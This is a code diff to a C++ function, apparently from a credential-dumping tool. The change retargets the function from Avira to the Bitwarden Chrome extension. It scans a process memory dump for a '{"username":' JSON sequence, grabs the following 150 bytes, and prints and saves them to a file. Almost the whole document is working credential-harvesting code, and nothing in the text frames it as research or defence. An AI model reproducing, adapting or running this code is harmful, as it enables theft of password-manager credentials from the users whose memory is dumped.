@@ -2,10 +2,9 @@
 #include <iostream>
 #include <fstream>
 #include <vector>
-#include <string>
-#include "../core/saveFile.h"
+#include "../../core/saveFile.h"
 
-int getCredsavira() {
+int getCredsbitwardenPluginChrome() {
     std::ifstream file("app.dmp", std::ios::binary);
 
     if (!file.is_open()) {
@@ -13,35 +12,34 @@ int getCredsavira() {
         return 1;
     }
 
-    std::vector<unsigned char> searchPattern = { 0x21, 0x6a, 0x19, 0x00, 0x19, 0x02, 0x00, 0x00, 0x19, 0x02, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x8d, 0x05, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00 };
-    std::vector<unsigned char> foundData;
+    std::string searchSequence = "{\"username\":";
+    std::vector<char> foundData;
 
     while (!file.eof()) {
-        unsigned char c;
-        file.read(reinterpret_cast<char*>(&c), sizeof(c));
+        char c;
+        file.get(c);
 
-        if (c == searchPattern[foundData.size()]) {
+        if (c == searchSequence[foundData.size()]) {
             foundData.push_back(c);
-            if (foundData.size() == searchPattern.size()) {
-                // We found the search pattern, now collect data until reaching the 600 data limit
-                std::vector<unsigned char> extractedData;
-                int dataCount = 0;
-
-                while (dataCount < 600 && !file.eof()) {
-                    file.read(reinterpret_cast<char*>(&c), sizeof(c));
+            if (foundData.size() == searchSequence.size()) {
+                // We found the search sequence, now collect the next 150 binary characters
+                std::vector<char> extractedData;
+                for (int i = 0; i < 150; i++) {
+                    file.get(c);
+                    if (file.eof()) {
+                        break;
+                    }
                     extractedData.push_back(c);
-                    dataCount++;
                 }
 
-                // Convert the binary data to a UTF-8 string
+                // Print the extracted data as UTF-8
                 std::string utf8ExtractedData(extractedData.begin(), extractedData.end());
-
-                // Print the extracted UTF-8 string
-                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;
+                std::cout << "Pattern Data: " + utf8ExtractedData << std::endl;  // Add a newline
 
                 //Save into file
                 saveFile(utf8ExtractedData);
 
+                // Clear the foundData vector to search for the next occurrence
                 foundData.clear();
             }
         }
